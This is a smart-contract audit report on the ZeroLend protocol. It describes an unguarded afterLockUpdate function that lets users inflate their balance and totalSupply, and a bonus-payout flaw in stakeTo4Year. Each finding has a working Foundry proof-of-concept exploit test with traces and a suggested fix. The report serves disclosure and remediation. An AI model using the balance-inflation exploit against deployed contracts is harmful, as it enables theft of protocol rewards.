# ZeroLend

<img src='https://raw.githubusercontent.com/erictee2802/audits/main/cantina/collections/erictee-zerolend.png'/>


## Findings Summary

| ID | Description | Severity |
| :-: | - | :-: |
| [H-01](#h-01-users-can-increase-his-balance-and-totalsupply-infinitely) | Users can increase his balance and totalSupply infinitely  | High |
| [M-01](#m-01-users-might-lose-bonus-when-bonuspool-contains-not-enough-bonuses-for-the-payout) | Users might lose bonus when BonusPool contains not enough bonuses for the payout.  | Medium |

## [H-01] Users can increase his balance and totalSupply infinitely 

### Bug Description

In ZLRewardsController.sol#L583-L590:

```javascript

    /**
     * @notice Hook for lock update.
     * @dev Called by the locking contracts after locking or unlocking happens
     * @param _user address
     */
    function afterLockUpdate(address _user) external {
        _updateRegisteredBalance(_user);
    }
```


Notice that the natsec indicates `afterLockUpdate` function is called by locking contracts after locking or unlocking happens, but we don't see this function getting called anywhere in ZeroLocker.sol. Additionally, this function is not protected with access control or any check to see if user is eligible to update registered balance, therefore anyone can call this function. User can call this function to increase his balance and totalSupply and transfer to another account that he owns to increase the balance and totalSupply again. This causes user can increase his balance and totalSupply infinitely which is a critical issue to the protocol.

### Impact

Balance and totalSupply can be increased infinitely which is a critical issue to the protocol.


### Proof Of Concept

* Install foundry.
* Rename the original `test` folder to `hardhat-test` and create a new folder name `test`.
* Add `forge-std` module to lib with command: `git submodule add https://github.com/foundry-rs/forge-std lib/forge-std`
* add `remappings.txt` file in incentive-contracts folder with the following content:

```
@layerzerolabs/=node_modules/@layerzerolabs/
@matterlabs/=node_modules/@matterlabs/
@openzeppelin-3/=node_modules/@openzeppelin-3/
@openzeppelin/=node_modules/@openzeppelin/
@pythnetwork/=node_modules/@pythnetwork/
@zerolendxyz/=node_modules/@zerolendxyz/
erc721a/=node_modules/erc721a/
eth-gas-reporter/=node_modules/eth-gas-reporter/
forge-std/=lib/forge-std/src/
hardhat-deploy/=node_modules/hardhat-deploy/
hardhat/=node_modules/hardhat/
ds-test/=lib/forge-std/lib/ds-test/src/
```

* Add `ZLRewardsController.t.sol` file within test folder with the following content:

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DefaultReserveInterestRateStrategy} from "@zerolendxyz/core-v3/contracts/protocol/pool/DefaultReserveInterestRateStrategy.sol";
import {AaveProtocolDataProvider} from "@zerolendxyz/core-v3/contracts/misc/AaveProtocolDataProvider.sol";
import {IPoolAddressesProvider} from '@zerolendxyz/core-v3/contracts/interfaces/IPoolAddressesProvider.sol';
import {IPoolDataProvider} from "@zerolendxyz/core-v3/contracts/interfaces/IPoolDataProvider.sol";
import {TestnetERC20} from "@zerolendxyz/periphery-v3/contracts/mocks/testnet-helpers/TestnetERC20.sol";
import {ACLManager} from "@zerolendxyz/core-v3/contracts/protocol/configuration/ACLManager.sol";
import {AaveOracle} from "@zerolendxyz/core-v3/contracts/misc/AaveOracle.sol";
import {PoolAddressesProvider} from "@zerolendxyz/core-v3/contracts/protocol/configuration/PoolAddressesProvider.sol";
import {AToken} from "@zerolendxyz/core-v3/contracts/protocol/tokenization/AToken.sol";
import {StableDebtToken} from "@zerolendxyz/core-v3/contracts/protocol/tokenization/StableDebtToken.sol";
import {VariableDebtToken} from "@zerolendxyz/core-v3/contracts/protocol/tokenization/VariableDebtToken.sol";
import {Pool} from "@zerolendxyz/core-v3/contracts/protocol/pool/Pool.sol";
import {IPool} from "@zerolendxyz/core-v3/contracts/interfaces/IPool.sol";
import {PoolConfigurator} from "@zerolendxyz/core-v3/contracts/protocol/pool/PoolConfigurator.sol";
import {IPoolConfigurator} from '@zerolendxyz/core-v3/contracts/interfaces/IPoolConfigurator.sol';
import {ConfiguratorInputTypes} from "@zerolendxyz/core-v3/contracts/protocol/libraries/types/ConfiguratorInputTypes.sol";




contract ZLRewardsControllerTest is Test {



    DefaultReserveInterestRateStrategy public strategy;
    AaveProtocolDataProvider public protocolDataProvider;
    TestnetERC20 public erc20;
    ACLManager public aclManager;
    AaveOracle public oracle;
    address public mockAggregator;
    PoolAddressesProvider public addressesProvider;
    AToken public aToken;
    StableDebtToken public stableDebtToken;
    VariableDebtToken public variableDebtToken;
    Pool public poolImpl;
    PoolConfigurator public poolConfiguratorImpl;

    address public token;
    address public vestedToken;
    address public zLRewardsController;
    address public locker;
    address public feeDistributor;
    address public stakingEmissions;
    address public vesting;
    address public bonusPool;

    address public pool;
    address public configurator;


    address public alice;
    address public bob;
    address public bob2;
    address public owner;
    address public vault;
    address[] public empty_address_array;
    uint[] public empty_uint_array;

    uint supply = (100000000000 * 1e18) / 100;

    


    function deployCore() public {
        deployLendingPool();
        token = deployCode("ZeroLend.sol", abi.encode(address(0)));
        
        vestedToken = deployCode("VestedZeroLend.sol");
        zLRewardsController = deployCode("ZLRewardsController.sol");
        locker = deployCode("ZeroLocker.sol");
        feeDistributor = deployCode("FeeDistributor.sol");
        stakingEmissions = deployCode("StakingEmissions.sol");
        vesting = deployCode("StreamedVesting.sol");
        bonusPool = deployCode("StreamedVesting.sol", abi.encode(address(token), address(vesting)));
        (bool success,) = vesting.call(abi.encodeWithSignature("initialize(address,address,address,address)",address(token), address(vestedToken),address(locker),address(bonusPool)));
        require(success, "call failed.");

        (bool success2, ) = feeDistributor.call(abi.encodeWithSignature("initialize(address,address)",address(locker), address(vestedToken)));
        require(success2, "call failed.");

        (bool success3, ) = locker.call(abi.encodeWithSignature("initialize(address)",address(token)));
        require(success3, "call failed.");

        (bool success4, ) = stakingEmissions.call(abi.encodeWithSignature("initialize(address,address,uint256)",address(feeDistributor),address(vestedToken),4807692e18));
        require(success4, "call failed.");

        (bool success5, ) = zLRewardsController.call(abi.encodeWithSignature("initialize(address,address,address,uint256,address,uint256)",address(configurator), address(vesting), address(locker), 1000, address(token), 0));
        require(success5, "call failed.");
    

        // fund 5% unvested to staking bonus
        IERC20(token).transfer(address(bonusPool), 5 * supply);

        // send 10% to liquidity
        IERC20(token).transfer(address(token), 10 * supply);

        // send 10% vested tokens to the staking contract
        IERC20(token).transfer(address(vesting), 10 * supply);
        IERC20(vestedToken).transfer(address(stakingEmissions), 10 * supply);

        // send 47% for emissions
        IERC20(token).transfer(address(vesting), 47 * supply);
        IERC20(vestedToken).transfer(address(vault), 47 * supply);

        // whitelist the bonding sale contract
        (bool success6, ) = vestedToken.call(abi.encodeWithSignature("addwhitelist(address,bool)",address(stakingEmissions), true));
        require(success6, "call failed.");
        
        (bool success7, ) = vestedToken.call(abi.encodeWithSignature("addwhitelist(address,bool)",address(feeDistributor), true));
        require(success7, "call failed.");
  
        // start vesting and staking emissions (for test)
        (bool success8, ) = vesting.call(abi.encodeWithSignature("start()"));
        require(success8, "call failed.");

        (bool success9, ) = stakingEmissions.call(abi.encodeWithSignature("start()"));
        require(success9, "call failed.");

      

     }



    function deployLendingPool() public {
        addressesProvider = new PoolAddressesProvider("0", address(owner));
        protocolDataProvider = new AaveProtocolDataProvider(IPoolAddressesProvider(addressesProvider));

        // setup tokens and mock aggregator
        erc20 = new TestnetERC20("WETH","WETH",18,address(owner));

        erc20.mint(bob,10 ether); // mint to bob for testing purposes.
        // mockAggregator = new MockAggregator(1800 * 1e8);
        mockAggregator = deployCode("MockAggregator.sol", abi.encode(1800 * 1e8)); // Need to do it like this because of incompatible solidity versions.
        
         // 2. Set the MarketId
        addressesProvider.setMarketId("Testnet");

        // deploy pool
        poolImpl = new Pool(IPoolAddressesProvider(addressesProvider));
        poolImpl.initialize(IPoolAddressesProvider(addressesProvider));

        // deploy pool configuratior
        poolConfiguratorImpl = new PoolConfigurator();
        poolConfiguratorImpl.initialize(IPoolAddressesProvider(addressesProvider));

        // deploy acl manager
        addressesProvider.setACLAdmin(address(owner));
        aclManager = new ACLManager(IPoolAddressesProvider(addressesProvider));
        addressesProvider.setACLManager(address(aclManager));

        aclManager.addPoolAdmin(address(owner));
        aclManager.addEmergencyAdmin(address(owner));

        // deploy oracle
        address[] memory erc20s = new address[](1);
        erc20s[0] = address(erc20);
        address[] memory mockAggregators = new address[](1);
        mockAggregators[0] = address(mockAggregator);

        oracle = new AaveOracle(IPoolAddressesProvider(addressesProvider), erc20s, mockAggregators, address(0), address(0), 1e8);
        addressesProvider.setPriceOracle(address(oracle));
        addressesProvider.setPoolImpl(address(poolImpl));
        addressesProvider.setPoolConfiguratorImpl(address(poolConfiguratorImpl));
        pool = addressesProvider.getPool();
        configurator = addressesProvider.getPoolConfigurator();
    
        aToken = new AToken(IPool(pool));
        stableDebtToken = new StableDebtToken(IPool(pool));
        variableDebtToken = new VariableDebtToken(IPool(pool));


        strategy = new DefaultReserveInterestRateStrategy(IPoolAddressesProvider(addressesProvider), 45e25, 0, 7e25, 3e27, 7e25, 3e27, 2e25, 5e25, 2e25);

        ConfiguratorInputTypes.InitReserveInput[] memory input = new ConfiguratorInputTypes.InitReserveInput[](1);
        input[0].aTokenImpl = address(aToken);
        input[0].stableDebtTokenImpl = address(stableDebtToken);
        input[0].variableDebtTokenImpl = address(variableDebtToken);
        input[0].underlyingAssetDecimals = 18;
        input[0].interestRateStrategyAddress = address(strategy);
        input[0].underlyingAsset = address(erc20);
        input[0].treasury = address(0);
        input[0].incentivesController = address(0);
        input[0].aTokenName = "ZeroLend z0 TEST";
        input[0].aTokenSymbol = "z0TEST";
        input[0].variableDebtTokenName = "ZeroLend Variable Debt TEST";
        input[0].variableDebtTokenSymbol = "variableDebtTEST";
        input[0].stableDebtTokenName = "ZeroLend Stable Debt TEST";
        input[0].stableDebtTokenSymbol = "stableDebtTEST}";
        input[0].params = "0x10";
    
        IPoolConfigurator(configurator).initReserves(input);
        IPoolConfigurator(configurator).setReserveBorrowing(address(erc20), true);
        IPoolConfigurator(configurator).configureReserveAsCollateral(address(erc20),8000,8250,10500);

    }

    

    
    function setUp() public {
        
        owner = makeAddr("OWNER");
        bob = makeAddr("BOB");
        bob2 = makeAddr("BOB2");
        alice = makeAddr("ALICE");
        vault = makeAddr("VAULT"); // just for testing

        vm.startPrank(owner);
        deployCore();
        address[] memory reserves = IPool(pool).getReservesList();
        IPoolDataProvider.TokenData[] memory aTokens = new IPoolDataProvider.TokenData[](reserves.length);
        aTokens = protocolDataProvider.getAllATokens();
        for(uint index; index < aTokens.length; index++) {
            IPoolDataProvider.TokenData memory element = aTokens[index];
            address atoken = element.tokenAddress;
            (bool success10, ) = atoken.call(abi.encodeWithSignature("setIncentivesController(address)",address(zLRewardsController)));
            require(success10, "call failed.");

        }

        vm.stopPrank();


     
        
    }

 

    function test_rightincentivecontroller() public {
        console.log("Should report the right incentive controller for every atoken");
        address[] memory reserves = IPool(pool).getReservesList();
        IPoolDataProvider.TokenData[] memory aTokens = new IPoolDataProvider.TokenData[](reserves.length);

        aTokens = protocolDataProvider.getAllATokens();
        for(uint index; index < aTokens.length; index++) {

            IPoolDataProvider.TokenData memory element = aTokens[index];
            address atoken = element.tokenAddress;
            (bool success11, bytes memory result2) = atoken.call(abi.encodeWithSignature("getIncentivesController()"));
            require(success11, "call failed");
            address incentivesController = abi.decode(result2,(address));
            assertEq(incentivesController,zLRewardsController);
         }
    }


    function test_IncreaseInfiniteBalanceAndTotalSupply() public {
        vm.startPrank(configurator); // pretends configurator has addPool() implementation here.
        (bool success13, ) = zLRewardsController.call(abi.encodeWithSignature("addPool(address,uint256)", address(erc20), 1000e18));
        require(success13, "call failed.");

        (bool success14, bytes memory result4 ) = zLRewardsController.call(abi.encodeWithSignature("poolLength()"));
        require(success14, "call failed.");
        uint pool_length = abi.decode(result4,(uint));
        assertEq(pool_length,1);
        vm.stopPrank();

    
        vm.startPrank(bob);
        (bool success15, ) = zLRewardsController.call(abi.encodeWithSignature("afterLockUpdate(address)", bob));
        require(success15,"call failed.");
        erc20.transfer(bob2,erc20.balanceOf(bob));
        vm.stopPrank();

        vm.startPrank(bob2);
        (bool success16, ) = zLRewardsController.call(abi.encodeWithSignature("afterLockUpdate(address)", bob2));
        require(success16,"call failed.");

        (bool success17, bytes memory result5) = zLRewardsController.call(abi.encodeWithSignature("poolInfo(address)", address(erc20)));
        require(success17,"call failed.");

        (uint totalsupply,,,,) = abi.decode(result5,(uint,uint,uint,uint,address));
        console.log(totalsupply);




    }

   
        


}
```

* Finally, run the foundry test with : `forge test --match-test test_IncreaseInfiniteBalanceAndTotalSupply -vvvv`

Foundry Result:
```javascript
Running 1 test for test/ZLRewardsController.t.sol:ZLRewardsControllerTest
[PASS] test_IncreaseInfiniteBalanceAndTotalSupply() (gas: 381672)
Logs:
  20000000000000000000

Traces:
  [381672] ZLRewardsControllerTest::test_IncreaseInfiniteBalanceAndTotalSupply()
    ├─ [0] VM::startPrank(InitializableImmutableAdminUpgradeabilityProxy: [0x4Db6f525895C99662b4790455A6b1f6BD835beF6])
    │   └─ ← ()
    ├─ [214133] ZLRewardsController::addPool(TestnetERC20: [0x7EF3FCb465e9543BeDC1456718c5329AE731e1e1], 1000000000000000000000 [1e21])
    │   └─ ← ()
    ├─ [394] ZLRewardsController::poolLength()
    │   └─ ← 1
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(BOB: [0xa53b369bDCbe05dcBB96d6550C924741902d2615])
    │   └─ ← ()
    ├─ [82026] ZLRewardsController::afterLockUpdate(BOB: [0xa53b369bDCbe05dcBB96d6550C924741902d2615])
    │   ├─ [2651] TestnetERC20::balanceOf(BOB: [0xa53b369bDCbe05dcBB96d6550C924741902d2615]) [staticcall]
    │   │   └─ ← 10000000000000000000 [1e19]
    │   ├─ emit BalanceUpdated(token: TestnetERC20: [0x7EF3FCb465e9543BeDC1456718c5329AE731e1e1], user: BOB: [0xa53b369bDCbe05dcBB96d6550C924741902d2615], balance: 10000000000000000000 [1e19], totalSupply: 10000000000000000000 [1e19])
    │   └─ ← ()
    ├─ [651] TestnetERC20::balanceOf(BOB: [0xa53b369bDCbe05dcBB96d6550C924741902d2615]) [staticcall]
    │   └─ ← 10000000000000000000 [1e19]
    ├─ [23299] TestnetERC20::transfer(BOB2: [0x9B93A4d7B643815ffC3118C0634de04Ce97e37b4], 10000000000000000000 [1e19])
    │   ├─ emit Transfer(from: BOB: [0xa53b369bDCbe05dcBB96d6550C924741902d2615], to: BOB2: [0x9B93A4d7B643815ffC3118C0634de04Ce97e37b4], value: 10000000000000000000 [1e19])
    │   └─ ← true
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(BOB2: [0x9B93A4d7B643815ffC3118C0634de04Ce97e37b4])
    │   └─ ← ()
    ├─ [33726] ZLRewardsController::afterLockUpdate(BOB2: [0x9B93A4d7B643815ffC3118C0634de04Ce97e37b4])
    │   ├─ [651] TestnetERC20::balanceOf(BOB2: [0x9B93A4d7B643815ffC3118C0634de04Ce97e37b4]) [staticcall]
    │   │   └─ ← 10000000000000000000 [1e19]
    │   ├─ emit BalanceUpdated(token: TestnetERC20: [0x7EF3FCb465e9543BeDC1456718c5329AE731e1e1], user: BOB2: [0x9B93A4d7B643815ffC3118C0634de04Ce97e37b4], balance: 10000000000000000000 [1e19], totalSupply: 20000000000000000000 [2e19])
    │   └─ ← ()
    ├─ [1160] ZLRewardsController::poolInfo(TestnetERC20: [0x7EF3FCb465e9543BeDC1456718c5329AE731e1e1])
    │   └─ ← 20000000000000000000 [2e19], 1000000000000000000000 [1e21], 1, 0, 0x0000000000000000000000000000000000000000
    ├─ [0] console::log(20000000000000000000 [2e19]) [staticcall]
    │   └─ ← ()
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 29.37ms
```
Noticed that Balance of bob and bob2 increases and totalSupply got increases twice.



### Recommended Mitigation

Implement necessary checks before update user's balance and totalSupply.




## [M-01] Users might lose bonus when BonusPool contains not enough bonuses for the payout.

### Bug Description

In `StreamedVesting.sol#L100-L123`:
```javascript
    function stakeTo4Year(uint256 id) external whenNotPaused {
        VestInfo memory vest = vests[id];
        require(msg.sender == vest.who, "not owner");

        uint256 lockAmount = vest.amount - vest.claimed;

        // update the lock as fully claimed
        vest.claimed = vest.amount;
        vests[id] = vest;

        // check if we can give a 20% bonus for 4 year staking
        uint256 bonusAmount = bonusPool.calculateBonus(lockAmount);
        if (underlying.balanceOf(address(bonusPool)) >= bonusAmount) {
            underlying.transferFrom(
                address(bonusPool),
                address(this),
                bonusAmount
            );
            lockAmount += bonusAmount;
        }

        // create a 4 year lock for the user
        locker.createLockFor(lockAmount, 86400 * 365 * 4, msg.sender);
    }
```

Consider the case if `BonusPool` has some tokens left however a staker decides to stake a lot of tokens which exceeds the amount that `BonusPool` can payout, the staker will lose all his bonuses.

### Impact

Stakers might get nothing in return even though there is still some bonus left in `BonusPool`.



### Proof Of Concept

* Install foundry.
* Rename the original `test` folder to `hardhat-test` and create a new folder name `test`.
* Add `forge-std` module to lib with command: `git submodule add https://github.com/foundry-rs/forge-std lib/forge-std`
* add `remappings.txt` file in incentive-contracts folder with the following content:

```
@layerzerolabs/=node_modules/@layerzerolabs/
@matterlabs/=node_modules/@matterlabs/
@openzeppelin-3/=node_modules/@openzeppelin-3/
@openzeppelin/=node_modules/@openzeppelin/
@pythnetwork/=node_modules/@pythnetwork/
@zerolendxyz/=node_modules/@zerolendxyz/
erc721a/=node_modules/erc721a/
eth-gas-reporter/=node_modules/eth-gas-reporter/
forge-std/=lib/forge-std/src/
hardhat-deploy/=node_modules/hardhat-deploy/
hardhat/=node_modules/hardhat/
ds-test/=lib/forge-std/lib/ds-test/src/
```

* Add `BonusPool.t.sol` file within `test` folder with the following content:

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {ZeroLend} from "../contracts/ZeroLend.sol";
import {VestedZeroLend} from "../contracts/VestedZeroLend.sol";
import {BonusPool} from "../contracts/BonusPool.sol";
import {StreamedVesting} from "../contracts/StreamedVesting.sol";
import {IERC20Burnable} from "../contracts/interfaces/IERC20Burnable.sol";
import {ZeroLocker} from "../contracts/ZeroLocker.sol";
import {IZeroLocker} from "../contracts/interfaces/IZeroLocker.sol";
import {IBonusPool} from "../contracts/interfaces/IBonusPool.sol";

contract BonusPoolTest is Test {
   
    address public admin;
    address public unlucky_user;
    address public bob;
    ZeroLend public zerolend;
    ZeroLocker public locker;
    VestedZeroLend public vestedzerolend;
    BonusPool public bonuspool;
    StreamedVesting public vesting;
    address public _lzEndpoint = address(0x1); // dummy address as it is just for testing purposes.
   
    function setUp() public {
        admin = makeAddr("ADMIN");
        unlucky_user = makeAddr("UNLUCKY_USER");
        bob = makeAddr("BOB");

        vm.startPrank(admin);
        zerolend = new ZeroLend(_lzEndpoint);
        vestedzerolend = new VestedZeroLend();
        vesting = new StreamedVesting();
        bonuspool = new BonusPool(IERC20(zerolend), address(vesting));
        locker = new ZeroLocker();
        locker.initialize(address(zerolend));
        vesting.initialize(IERC20(zerolend),IERC20Burnable(address(vestedzerolend)), IZeroLocker(locker), IBonusPool(bonuspool));
        vesting.start(); //Start vesting

        vestedzerolend.transfer(unlucky_user, 1000 ether); //Fund unlucky_user with tokens for testing purposes.
        zerolend.transfer(address(vesting), 1000 ether); // Fund vesting some underlying tokens so that ZeroLocker::createLockFor can run successfully.
        zerolend.transfer(address(bonuspool), 10 ether);
        vm.stopPrank();
    }

 



    function test_StakerLostBonusesIfHeStakeTooMuch() public {
         // Scenario of BonusPool has some tokens left but not big enough to payout bonuses to big staker.
        vm.startPrank(unlucky_user);
        vestedzerolend.approve(address(vesting), type(uint).max);
        vesting.createVest(1000 ether);
        console.log("User suppose to receive: ", bonuspool.calculateBonus(1000 ether));
        uint expectedBonus = 0; // ExpectedBonus will be zero here since BonusPool doesn't contains enough tokens to pay bonuses
        console.log(expectedBonus);
        vesting.stakeTo4Year(1); // ID start from 1 as unlucky_user is the first user to call createVest()
        (int128 amount,,) = locker.locked(1);
        uint uint_amount = uint(int256(amount));
        assertEq(expectedBonus + 1000 ether == uint_amount, true);


    }  
}
```
* Finally, run the foundry test with : `forge test --match-test test_StakerLostBonusesIfHeStakeTooMuch  -vvvv`

In this scenario, `BonusPool` has 10 ZeroLend tokens left and unlucky_user decides to stake 1000 vested ZeroLend tokens, he should be eligible for 200 ZeroLend tokens of bonuses, but from the test he received 0 bonus even though there is still 10 ZeroLend tokens left in BonusPool.


Foundry Result:
```javascript
Running 1 test for test/BonusPool.t.sol:BonusPoolTest
[PASS] test_StakerLostBonusesIfHeStakeTooMuch() (gas: 716654)
Logs:
  ZeroLend Balance of BonusPool:  10000000000000000000
  User suppose to receive:  200000000000000000000
  0

Traces:
  [716654] BonusPoolTest::test_StakerLostBonusesIfHeStakeTooMuch()
    ├─ [2599] ZeroLend::balanceOf(BonusPool: [0x0bEe7563F91265b39626b09accCb543Ce995CAd9]) [staticcall]
    │   └─ ← 10000000000000000000 [1e19]
    ├─ [0] console::log("ZeroLend Balance of BonusPool: ", 10000000000000000000 [1e19]) [staticcall]
    │   └─ ← ()
    ├─ [0] VM::startPrank(UNLUCKY_USER: [0xaE86C05287A899B3F48E68E99036BFDa505d13Be])
    │   └─ ← ()
    ├─ [24651] VestedZeroLend::approve(StreamedVesting: [0x0a6e47dbFBa7e9B3e6429686BE65d6eac6355D09], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: UNLUCKY_USER: [0xaE86C05287A899B3F48E68E99036BFDa505d13Be], spender: StreamedVesting: [0x0a6e47dbFBa7e9B3e6429686BE65d6eac6355D09], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← true
    ├─ [179973] StreamedVesting::createVest(1000000000000000000000 [1e21])
    │   ├─ [15737] VestedZeroLend::burnFrom(UNLUCKY_USER: [0xaE86C05287A899B3F48E68E99036BFDa505d13Be], 1000000000000000000000 [1e21])
    │   │   ├─ emit Transfer(from: UNLUCKY_USER: [0xaE86C05287A899B3F48E68E99036BFDa505d13Be], to: 0x0000000000000000000000000000000000000000, value: 1000000000000000000000 [1e21])
    │   │   └─ ← ()
    │   ├─ emit VestingCreated(who: UNLUCKY_USER: [0xaE86C05287A899B3F48E68E99036BFDa505d13Be], vestId: 1, amount: 1000000000000000000000 [1e21], timestamp: 1)
    │   └─ ← ()
    ├─ [2585] BonusPool::calculateBonus(1000000000000000000000 [1e21]) [staticcall]
    │   └─ ← 200000000000000000000 [2e20]
    ├─ [0] console::log("User suppose to receive: ", 200000000000000000000 [2e20]) [staticcall]
    │   └─ ← ()
    ├─ [0] console::log(0) [staticcall]
    │   └─ ← ()
    ├─ [473084] StreamedVesting::stakeTo4Year(1)
    │   ├─ [585] BonusPool::calculateBonus(1000000000000000000000 [1e21])
    │   │   └─ ← 200000000000000000000 [2e20]
    │   ├─ [599] ZeroLend::balanceOf(BonusPool: [0x0bEe7563F91265b39626b09accCb543Ce995CAd9]) [staticcall]
    │   │   └─ ← 10000000000000000000 [1e19]
    │   ├─ [439727] ZeroLocker::createLockFor(1000000000000000000000 [1e21], 126144000 [1.261e8], UNLUCKY_USER: [0xaE86C05287A899B3F48E68E99036BFDa505d13Be])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UNLUCKY_USER: [0xaE86C05287A899B3F48E68E99036BFDa505d13Be], tokenId: 1)
    │   │   ├─ [31973] ZeroLend::transferFrom(StreamedVesting: [0x0a6e47dbFBa7e9B3e6429686BE65d6eac6355D09], ZeroLocker: [0xD18727249628613eFe0227170ad9Bd24f54734F5], 1000000000000000000000 [1e21])
    │   │   │   ├─ emit Transfer(from: StreamedVesting: [0x0a6e47dbFBa7e9B3e6429686BE65d6eac6355D09], to: ZeroLocker: [0xD18727249628613eFe0227170ad9Bd24f54734F5], value: 1000000000000000000000 [1e21])
    │   │   │   └─ ← true
    │   │   ├─ emit Deposit(provider: StreamedVesting: [0x0a6e47dbFBa7e9B3e6429686BE65d6eac6355D09], tokenId: 1, value: 1000000000000000000000 [1e21], locktime: 125798400 [1.257e8], deposit_type: 1, ts: 1)
    │   │   ├─ emit Supply(prevSupply: 0, supply: 1000000000000000000000 [1e21])
    │   │   └─ ← 1
    │   └─ ← ()
    ├─ [874] ZeroLocker::locked(1) [staticcall]
    │   └─ ← 1000000000000000000000 [1e21], 125798400 [1.257e8], 1
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.38ms
```

### Recommended Mitigation

Transfer all ZeroLend tokens that is left in `BonusPool` when `bonusAmount > underlying.balanceOf(address(bonusPool))` so that at least users don't receive nothing even though there is token left in `BonusPool`.




